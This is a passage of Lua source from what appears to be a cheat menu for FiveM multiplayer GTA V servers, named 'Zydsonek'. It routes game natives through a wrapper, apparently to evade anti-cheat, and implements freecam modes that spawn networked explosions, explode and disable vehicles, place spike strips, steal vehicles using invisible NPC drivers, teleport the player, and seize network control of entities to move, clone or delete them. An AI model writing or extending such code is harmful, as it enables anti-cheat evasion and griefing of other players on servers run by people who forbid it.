                ZYD:GetFunction("AddExplosion")(ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
            elseif ZYD:GetFunction("DoesEntityExist")(ent) and ZYD:GetFunction("IsEntityAVehicle")(ent) then
                ZYD:GetFunction("NetworkExplodeVehicle")(ent, true, false, false)
            else
                ZYD:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 7, 100000.0, true, false, 0.0)
            end
        end
    end

    local preview_spike_strip
    local spike_model = "p_ld_stinger_s"

    function ZYD.FreeCam:DoSpikeStrips(ent, endCoords)
        if not preview_spike_strip then
            preview_spike_strip = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z + 0.1, false, true, true)
        end

        local rot = ZYD:GetFunction("GetCamRot")(self.Cam, 0)
        ZYD:GetFunction("SetEntityCoords")(preview_spike_strip, endCoords.x, endCoords.y, endCoords.z + 0.1)
        ZYD:GetFunction("SetEntityAlpha")(preview_spike_strip, 100)
        ZYD:GetFunction("FreezeEntityPosition")(preview_spike_strip, true)
        ZYD:GetFunction("SetEntityRotation")(preview_spike_strip, 0.0, 0.0, rot.z + 0.0)
        ZYD:GetFunction("SetEntityCollision")(preview_spike_strip, false, false)

        if IsDisabledControlJustPressed(0, ZYD.Keys["MOUSE1"]) then
            rot = ZYD:GetFunction("GetEntityRotation")(preview_spike_strip)
            local spike_strip = ZYD:GetFunction("CreateObject")(ZYD:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z - 0.2, true, true, true)
            ZYD:DoNetwork(spike_strip)
            ZYD:GetFunction("SetEntityRotation")(spike_strip, rot)
            ZYD:GetFunction("FreezeEntityPosition")(spike_strip, true)
        end
    end

    function ZYD.FreeCam:DoDisable(ent, endCoords)
        if ZYD:GetFunction("IsEntityAVehicle")(ent) then
            if IsDisabledControlJustPressed(0, ZYD.Keys["MOUSE1"]) then
                ZYD:DisableVehicle(ent)
            end

            self:DrawBoundingBox(ent, 50, 122, 200, 50)
        end
    end

    local _stealing
    local _stealing_ped

    function ZYD.FreeCam:DoRCCar(ent, endCoords)
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTSHIFT"], 0), "Invisible"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["X"], 0), "Spawn (NPC)"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["R"], 0), "Release Car (If Active)"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE2"], 0), "Steal (NPC)"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Steal (Force)"}, {"b_117", "Change Mode"}})

        if _stealing then
            self:DrawBoundingBox(_stealing_ped, 255, 122, 184, 50)

            return self:DrawBoundingBox(_stealing, 255, 120, 255, 50)
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["R"]) and ZYD.RCCar.On then
            ZYD:AddNotification("INFO", "Released RC Car!")
            _stealing = nil
            _stealing_ped = nil

            return ZYD:DoRCCar(false)
        end

        if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE2"]) and self:CheckType(ent, "VEHICLE") then
            CreateThread(function()
                _stealing = ent
                local model = ZYD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ZYD.FreeCam.SpawnerOptions.PED)]

                if not ZYD:RequestModelSync(model) then
                    _stealing = nil

                    return ZYD:AddNotification("Failed to steal vehicle!")
                end

                local c = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
                local x, y, z = c.x, c.y, c.z
                local out, pos = ZYD:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)

                if not out then
                    pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0) + vector3(dict.math.random(-3, 3), dict.math.random(-3, 3), 0)
                end

                local random_npc = ZYD:GetFunction("CreatePed")(24, ZYD:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
                _stealing_ped = random_npc

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                    ZYD:GetFunction("SetEntityVisible")(random_npc, false)
                end

                ZYD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                local success = ZYD:StealVehicleThread(random_npc, _stealing, true)
                ZYD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
                ZYD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                local timeout = 0

                if not success then
                    _stealing = nil
                    _stealing_ped = nil

                    return
                end

                while ZYD:GetFunction("DoesEntityExist")(_stealing) and ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not ZYD:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
                    timeout = timeout + 10
                    Wait(100)
                end

                if ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                    _stealing = nil

                    return ZYD:AddNotification("ERROR", "Failed to steal vehicle!")
                end

                ZYD:DoRCCar(random_npc, _stealing)
                _stealing_ped = nil
                _stealing = nil
            end)
        elseif ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and self:CheckType(ent, "VEHICLE") then
            CreateThread(function()
                _stealing = ent
                local model = ZYD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ZYD.FreeCam.SpawnerOptions.PED)]

                if not ZYD:RequestModelSync(model) then
                    _stealing = nil

                    return ZYD:AddNotification("ERROR", "Failed to steal vehicle!")
                end

                ZYD:GetFunction("ClearPedTasksImmediately")(ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
                local random_npc = ZYD:GetFunction("CreatePedInsideVehicle")(_stealing, 24, ZYD:GetFunction("GetHashKey")(model), -1, true, true)

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                    ZYD:GetFunction("SetEntityVisible")(random_npc, false)
                end

                ZYD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                ZYD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
                ZYD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                _stealing_ped = random_npc

                if ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                    _stealing = nil

                    return ZYD:AddNotification("ERROR", "Failed to steal vehicle!")
                end

                ZYD:DoRCCar(random_npc, _stealing)
                _stealing_ped = nil
                _stealing = nil
            end)
        elseif ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["X"]) then
            CreateThread(function()
                local modelName = ZYD:GetTextInput("Enter vehicle spawn name", "", 20)
                if modelName == "" or not ZYD:RequestModelSync(modelName) then return ZYD:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000) end

                if modelName then
                    local car = ZYD:GetFunction("CreateVehicle")(ZYD:GetFunction("GetHashKey")(modelName), endCoords.x, endCoords.y, endCoords.z, dict.math.random(-360, 360) + 0.0, true, false)

                    if ZYD:GetFunction("DoesEntityExist")(car) then
                        _stealing = car
                        local model = ZYD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ZYD.FreeCam.SpawnerOptions.PED)]

                        if not ZYD:RequestModelSync(model) then
                            _stealing = nil

                            return ZYD:AddNotification("ERROR", "Failed to steal vehicle!")
                        end

                        ZYD:GetFunction("ClearPedTasksImmediately")(ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
                        local random_npc = ZYD:GetFunction("CreatePedInsideVehicle")(_stealing, 24, ZYD:GetFunction("GetHashKey")(model), -1, true, true)
                        ZYD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                        ZYD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
                        ZYD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                        _stealing_ped = random_npc

                        if ZYD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                            _stealing = nil

                            return ZYD:AddNotification("ERROR", "Failed to steal vehicle!")
                        end

                        ZYD:DoRCCar(random_npc, _stealing)
                        _stealing_ped = nil
                        _stealing = nil
                    end
                end
            end)
        end

        self:DrawBoundingBox(ent, 255, 255, 120, 50)
        self:DrawInfoCard(ent)
    end

    function ZYD.FreeCam:ManipulationLogic(cam, x, y, z)
        if ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
        self:Crosshair((ZYD:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and ZYD:GetFunction("DoesEntityExist")(self.HoveredEntity)) or (ZYD:GetFunction("DoesEntityHaveDrawable")(self.DraggingEntity) and ZYD:GetFunction("DoesEntityExist")(self.DraggingEntity)))
        local rightVec, forwardVec, upVec = ZYD:GetFunction("GetCamMatrix")(cam)
        local curVec = vector3(x, y, z)
        local targetVec = curVec + forwardVec * 150
        local handle = ZYD:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
        local _, hit, endCoords, _, entity = ZYD:GetFunction("GetShapeTestResult")(handle)

        if self.DraggingEntity and not ZYD:GetFunction("DoesEntityExist")(self.DraggingEntity) then
            self.DraggingEntity = nil
            self.Rotating = nil
            lift_height = 0.0
            lift_inc = 0.1

            return
        end

        if ZYD.Showing then return end

        if notif_alpha > 0 then
            offX = _lerp(0.1, offX, 429)
        else
            offX = _lerp(0.1, offX, 0)
        end

        if not hit then
            endCoords = targetVec
        end

        if preview_spike_strip and ZYD:GetFunction("DoesEntityExist")(preview_spike_strip) and self.Mode ~= self.Modes["SPIKE_STRIPS"] then
            ZYD.Util:DeleteEntity(preview_spike_strip)
            preview_spike_strip = nil
        end

        if self:CheckType(entity, "ALL") then
            self.HoveredEntity = entity
        else
            self.HoveredEntity = nil
        end

        if self.Mode == self.Modes["REMOVER"] then return self:Remover(entity, "ALL") end
        ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["E"], 0), "Clone"}})

        if self.Mode == self.Modes["PED_SPAWNER"] then
            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PED")
        elseif self.Mode == self.Modes["OBJ_SPAWNER"] then
            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "OBJECT")
        elseif self.Mode == self.Modes["VEH_SPAWNER"] then
            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "VEHICLE")
        elseif self.Mode == self.Modes["PREMADE_SPAWNER"] then
            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PREMADE")
        elseif self.Mode == self.Modes["TELEPORT"] then
            ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Teleport"}, {"b_117", "Change Mode"}})

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and not ZYD.Showing and hit then
                ZYD:GetFunction("SetEntityCoords")(ZYD:GetFunction("PlayerPedId")(), endCoords.x, endCoords.y, endCoords.z)
                ZYD:AddNotification("INFO", "Teleported!", 2500)
            end

            return
        elseif self.Mode == self.Modes["RC_CAR"] then
            return self:DoRCCar(self.HoveredEntity, endCoords)
        elseif self.Mode == self.Modes["STEAL"] then
            return self:DoSteal(self.HoveredEntity)
        elseif self.Mode == self.Modes["TAZE"] then
            return self:DoTaze(self.HoveredEntity, endCoords)
        elseif self.Mode == self.Modes["HYDRANT"] then
            return self:DoHydrant(self.HoveredEntity, endCoords)
        elseif self.Mode == self.Modes["FIRE"] then
            return self:DoFire(self.HoveredEntity, endCoords)
        elseif self.Mode == self.Modes["SPIKE_STRIPS"] then
            return self:DoSpikeStrips(self.HoveredEntity, endCoords)
        elseif self.Mode == self.Modes["DISABLE_VEHICLE"] then
            return self:DoDisable(self.HoveredEntity, endCoords)
        elseif self.Mode == self.Modes["EXPLODE"] then
            return self:DoExplosion(self.HoveredEntity, endCoords)
        end

        if ZYD:GetFunction("DoesEntityExist")(self.DraggingEntity) then
            if frozen_ents[self.DraggingEntity] == nil then
                frozen_ents[self.DraggingEntity] = true
            end

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["DELETE"]) and not ZYD.Showing then
                if self.DraggingEntity == ZYD:GetFunction("PlayerPedId")() then return ZYD:AddNotification("ERROR", "You can not delete yourself!", 10000) end
                if _is_ped_player(self.DraggingEntity) then return ZYD:AddNotification("ERROR", "You can not delete players!", 10000) end
                self:DrawBoundingBox(self.DraggingEntity, 255, 50, 50, 50)
                ZYD:AddNotification("INFO", "Deleted ~y~" .. dict.tostring(self.DraggingEntity) .. "~w~", 10000)
                ZYD.Util:DeleteEntity(self.DraggingEntity)
                self.DraggingEntity = nil
                lift_height = 0.0
                lift_inc = 0.1
                self.Rotating = nil

                return
            end

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["E"]) then
                self:Clone(self.DraggingEntity)
            end

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE2"]) and not ZYD.Showing then
                local data = self.DraggingData

                if data then
                    ZYD:GetFunction("SetEntityCoords")(self.DraggingEntity, data.Position.x, data.Position.y, data.Position.z)
                    ZYD:GetFunction("SetEntityRotation")(self.DraggingEntity, data.Rotation.x, data.Rotation.y, data.Rotation.z)
                end

                self.DraggingEntity = nil
                lift_height = 0.0
                lift_inc = 0.1
                self.Rotating = nil

                return
            elseif ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and not ZYD.Showing then
                self.DraggingEntity = nil
                lift_height = 0.0
                lift_inc = 0.1
                self.Rotating = nil

                return
            end

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["R"]) and not ZYD.Showing then
                self.Rotating = not self.Rotating
                local rot = ZYD:GetFunction("GetEntityRotation")(self.DraggingEntity)
                rotP, rotY, rotR = rot.x, rot.y, rot.z
            end

            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["LEFTALT"]) and not self.Rotating then
                frozen_ents[self.DraggingEntity] = not frozen_ents[self.DraggingEntity]
            end

            ZYD:GetFunction("FreezeEntityPosition")(self.DraggingEntity, frozen_ents[entity])

            if self.Rotating and not ZYD.Showing then
                self:DrawBoundingBox(self.DraggingEntity, 255, 125, 50, 50)
                ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["R"], 0), "Exit Rotate Mode"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE2"], 0), "Reset Position"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Stop Dragging"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTSHIFT"], 0), "Snap Nearest 45 Degrees"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTALT"], 0), "Increment x" .. (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTALT"]) and 1.0 or 15.0)}, {"t_D%t_A", "Roll"}, {"t_W%t_S", "Pitch"}, {"b_2000%t_X", "Yaw"}})

                if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["D"]) then
                    rotR = rotR + (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTALT"]) and 1.0 or 15.0)

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                        rotR = _snap(rotR)
                    end
                end

                if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["A"]) then
                    rotR = rotR - (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTALT"]) and 1.0 or 15.0)

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                        rotR = _snap(rotR)
                    end
                end

                if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["W"]) then
                    rotP = rotP - (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTALT"]) and 1.0 or 15.0)

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                        rotP = _snap(rotP)
                    end
                end

                if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["S"]) then
                    rotP = rotP + (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTALT"]) and 1.0 or 15.0)

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                        rotP = _snap(rotP)
                    end
                end

                if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["SPACE"]) then
                    rotY = rotY - (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTALT"]) and 1.0 or 15.0)

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                        rotY = _snap(rotY)
                    end
                end

                if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["X"]) then
                    rotY = rotY + (ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTALT"]) and 1.0 or 15.0)

                    if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                        rotY = _snap(rotY)
                    end
                end

                ZYD:GetFunction("SetEntityRotation")(self.DraggingEntity, rotP + 0.0, rotY + 0.0, rotR + 0.0)
                self:DrawInfoCard(self.DraggingEntity)

                return ZYD:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
            end

            local handleTrace = ZYD:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1, self.DraggingEntity)
            local _, hit, endPos, _, _ = ZYD:GetFunction("GetShapeTestResult")(handleTrace)
            local c = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.DraggingEntity, 0.0, 0.0, 0.0)
            local cX, cY, cZ = c.x, c.y, c.z
            local cam_rot = ZYD:GetFunction("GetCamRot")(self.Cam, 0)
            local rot = ZYD:GetFunction("GetEntityRotation")(self.DraggingEntity)
            ZYD:GetFunction("SetEntityRotation")(self.DraggingEntity, rot.x, rot.y, cam_rot.z + 0.0)

            if IsDisabledControlJustPressed(0, ZYD.Keys["["]) then
                lift_inc = lift_inc + 0.05

                if lift_inc <= 0.01 then
                    lift_inc = 0.01
                elseif lift_inc >= 3 then
                    lift_inc = 3
                end
            end

            if IsDisabledControlJustPressed(0, ZYD.Keys["]"]) then
                lift_inc = lift_inc - 0.05

                if lift_inc <= 0.01 then
                    lift_inc = 0.01
                elseif lift_inc >= 3 then
                    lift_inc = 3
                end
            end

            if IsDisabledControlPressed(0, ZYD.Keys["C"]) then
                lift_height = lift_height + lift_inc
            end

            if IsDisabledControlPressed(0, ZYD.Keys["Z"]) then
                lift_height = lift_height - lift_inc
            end

            if hit then
                ZYD:GetFunction("SetEntityCoords")(self.DraggingEntity, endPos.x, endPos.y, endPos.z + lift_height)
                self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
            else
                ZYD:GetFunction("SetEntityCoords")(self.DraggingEntity, targetVec.x, targetVec.y, targetVec.z + lift_height)
                self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
            end

            self:DrawInfoCard(self.DraggingEntity)
            ZYD:SetIbuttons({{ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["C"], 0), "Lift Up (+" .. lift_inc .. ")"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["Z"], 0), "Push Down (-" .. lift_inc .. ")"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["R"], 0), "Rotate"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["LEFTALT"], 0), "Toggle Frozen"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE2"], 0), "Reset Position"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["MOUSE1"], 0), "Stop Dragging"}, {ZYD:GetFunction("GetControlInstructionalButton")(0, ZYD.Keys["E"], 0), "Clone"}})

            return ZYD:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
        end

        local ent = ZYD:GetFunction("DoesEntityExist")(self.DraggingEntity) and self.DraggingEntity or self.HoveredEntity

        if ZYD:GetFunction("DoesEntityExist")(ent) and ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["E"]) then
            self:Clone(ent)
        end

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) or beginning_target ~= nil then return self:PedTarget(cam, x, y, z) end

        if ZYD:GetFunction("DoesEntityExist")(self.HoveredEntity) and ZYD:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and not ZYD:GetFunction("DoesEntityExist")(self.DraggingEntity) then
            if ZYD:GetFunction("IsDisabledControlJustPressed")(0, ZYD.Keys["MOUSE1"]) and not ZYD.Showing and not _is_ped_player(self.HoveredEntity) then
                self.DraggingEntity = self.HoveredEntity

                self.DraggingData = {
                    Position = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.HoveredEntity, 0.0, 0.0, 0.0),
                    Rotation = ZYD:GetFunction("GetEntityRotation")(self.HoveredEntity)
                }
            else
                self:DrawBoundingBox(self.HoveredEntity, 255, 255, 255, 50)
                self:DrawInfoCard(self.HoveredEntity)
            end
        end
    end

    function ZYD.FreeCam:DisableMovement(off)
        ZYD:GetFunction("DisableControlAction")(1, 30, off)
        ZYD:GetFunction("DisableControlAction")(1, 31, off)
        ZYD:GetFunction("DisableControlAction")(1, 32, off)
        ZYD:GetFunction("DisableControlAction")(1, 33, off)
        ZYD:GetFunction("DisableControlAction")(1, 34, off)
        ZYD:GetFunction("DisableControlAction")(1, 35, off)
        ZYD:GetFunction("DisableControlAction")(1, 36, off)
        ZYD:GetFunction("DisableControlAction")(1, 37, off)
        ZYD:GetFunction("DisableControlAction")(1, 38, off)
        ZYD:GetFunction("DisableControlAction")(1, 44, off)
        ZYD:GetFunction("DisableControlAction")(1, 45, off)
        ZYD:GetFunction("DisableControlAction")(0, 63, off)
        ZYD:GetFunction("DisableControlAction")(0, 64, off)
        ZYD:GetFunction("DisableControlAction")(0, 71, off)
        ZYD:GetFunction("DisableControlAction")(0, 72, off)
        ZYD:GetFunction("DisableControlAction")(0, 75, off)
        ZYD:GetFunction("DisableControlAction")(0, 278, off)
        ZYD:GetFunction("DisableControlAction")(0, 279, off)
        ZYD:GetFunction("DisableControlAction")(0, 280, off)
        ZYD:GetFunction("DisableControlAction")(0, 281, off)
        ZYD:GetFunction("DisablePlayerFiring")(ZYD:GetFunction("PlayerId")(), off)
        ZYD:GetFunction("DisableControlAction")(0, 24, off)
        ZYD:GetFunction("DisableControlAction")(0, 25, off)
        ZYD:GetFunction("DisableControlAction")(1, 37, off)
        ZYD:GetFunction("DisableControlAction")(0, 47, off)
        ZYD:GetFunction("DisableControlAction")(0, 58, off)
        ZYD:GetFunction("DisableControlAction")(0, 140, off)
        ZYD:GetFunction("DisableControlAction")(0, 141, off)
        ZYD:GetFunction("DisableControlAction")(0, 81, off)
        ZYD:GetFunction("DisableControlAction")(0, 82, off)
        ZYD:GetFunction("DisableControlAction")(0, 83, off)
        ZYD:GetFunction("DisableControlAction")(0, 84, off)
        ZYD:GetFunction("DisableControlAction")(0, 12, off)
        ZYD:GetFunction("DisableControlAction")(0, 13, off)
        ZYD:GetFunction("DisableControlAction")(0, 14, off)
        ZYD:GetFunction("DisableControlAction")(0, 15, off)
        ZYD:GetFunction("DisableControlAction")(0, 24, off)
        ZYD:GetFunction("DisableControlAction")(0, 16, off)
        ZYD:GetFunction("DisableControlAction")(0, 17, off)
        ZYD:GetFunction("DisableControlAction")(0, 96, off)
        ZYD:GetFunction("DisableControlAction")(0, 97, off)
        ZYD:GetFunction("DisableControlAction")(0, 98, off)
        ZYD:GetFunction("DisableControlAction")(0, 96, off)
        ZYD:GetFunction("DisableControlAction")(0, 99, off)
        ZYD:GetFunction("DisableControlAction")(0, 100, off)
        ZYD:GetFunction("DisableControlAction")(0, 142, off)
        ZYD:GetFunction("DisableControlAction")(0, 143, off)
        ZYD:GetFunction("DisableControlAction")(0, 263, off)
        ZYD:GetFunction("DisableControlAction")(0, 264, off)
        ZYD:GetFunction("DisableControlAction")(0, 257, off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["C"], off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["F"], off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["LEFTCTRL"], off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["MOUSE1"], off)
        ZYD:GetFunction("DisableControlAction")(1, 25, off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["R"], off)
        ZYD:GetFunction("DisableControlAction")(1, 45, off)
        ZYD:GetFunction("DisableControlAction")(1, 80, off)
        ZYD:GetFunction("DisableControlAction")(1, 140, off)
        ZYD:GetFunction("DisableControlAction")(1, 250, off)
        ZYD:GetFunction("DisableControlAction")(1, 263, off)
        ZYD:GetFunction("DisableControlAction")(1, 310, off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["TAB"], off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["SPACE"], off)
        ZYD:GetFunction("DisableControlAction")(1, ZYD.Keys["X"], off)
    end

    function ZYD.FreeCam:DisableCombat(off)
        ZYD:GetFunction("DisablePlayerFiring")(ZYD:GetFunction("PlayerId")(), off) -- Disable weapon firing
        ZYD:GetFunction("DisableControlAction")(0, 24, off) -- disable attack
        ZYD:GetFunction("DisableControlAction")(0, 25, off) -- disable aim
        ZYD:GetFunction("DisableControlAction")(1, 37, off) -- disable weapon select
        ZYD:GetFunction("DisableControlAction")(0, 47, off) -- disable weapon
        ZYD:GetFunction("DisableControlAction")(0, 58, off) -- disable weapon
        ZYD:GetFunction("DisableControlAction")(0, 140, off) -- disable melee
        ZYD:GetFunction("DisableControlAction")(0, 141, off) -- disable melee
        ZYD:GetFunction("DisableControlAction")(0, 142, off) -- disable melee
        ZYD:GetFunction("DisableControlAction")(0, 143, off) -- disable melee
        ZYD:GetFunction("DisableControlAction")(0, 263, off) -- disable melee
        ZYD:GetFunction("DisableControlAction")(0, 264, off) -- disable melee
        ZYD:GetFunction("DisableControlAction")(0, 257, off) -- disable melee
    end

    function ZYD.FreeCam:MoveCamera(cam, x, y, z)
        if ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return x, y, z end
        if self.Rotating then return x, y, z end
        local curVec = vector3(x, y, z)
        local rightVec, forwardVec, upVec = ZYD:GetFunction("GetCamMatrix")(cam)
        local speed = 1.0

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTCTRL"]) then
            speed = 0.1
        elseif ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
            speed = 1.8
        end

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["W"]) then
            curVec = curVec + forwardVec * speed
        end

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["S"]) then
            curVec = curVec - forwardVec * speed
        end

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["A"]) then
            curVec = curVec - rightVec * speed
        end

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["D"]) then
            curVec = curVec + rightVec * speed
        end

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["SPACE"]) then
            curVec = curVec + upVec * speed
        end

        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["X"]) then
            curVec = curVec - upVec * speed
        end

        return curVec.x, curVec.y, curVec.z
    end

    function ZYD.FreeCam:DrawMode()
        local name = self.ModeNames[self.Mode]
        ZYD:ScreenText("~w~[~y~Zydsonek~w~] Tryb freecama: ~y~" .. name, 4, 1.0, 0.5, 0.97, 0.35, 255, 255, 255, 225)
    end

    local _on

    function ZYD.FreeCam:Tick()
        if not ZYD:GetFunction("DoesCamExist")(self.Cam) then
            self.Cam = ZYD:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
        end

        while ZYD.Enabled do
            ZYD.FreeCam:Switcher()
            local rot_vec = ZYD:GetFunction("GetGameplayCamRot")(0)
            Wait(0)

            if self.On and not _on then
                ZYD:GetFunction("SetCamActive")(self.Cam, true)
                ZYD:GetFunction("RenderScriptCams")(true, false, false, true, true)
                _on = true
                local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0) + (ZYD:GetFunction("GetEntityForwardVector")(ZYD:GetFunction("PlayerPedId")()) * 2)
                camX, camY, camZ = coords.x, coords.y, coords.z + 1.0
                ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
